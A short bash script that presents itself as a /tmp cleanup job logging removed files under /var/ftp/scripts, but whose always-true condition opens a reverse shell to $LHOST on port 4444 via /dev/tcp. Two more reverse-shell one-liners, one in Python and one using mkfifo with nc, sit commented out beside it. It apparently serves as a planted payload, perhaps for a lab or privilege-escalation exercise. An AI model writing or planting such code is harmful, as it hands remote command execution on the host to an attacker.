#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
    bash -i >& /dev/tcp/$LHOST/4444 0>&1
    #python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$LHOST",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    #mkfifo /tmp/jptpl; nc $LHOST 4444 0</tmp/jptpl | /bin/sh >/tmp/jptpl 2>&1; rm /tmp/jptpl

else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
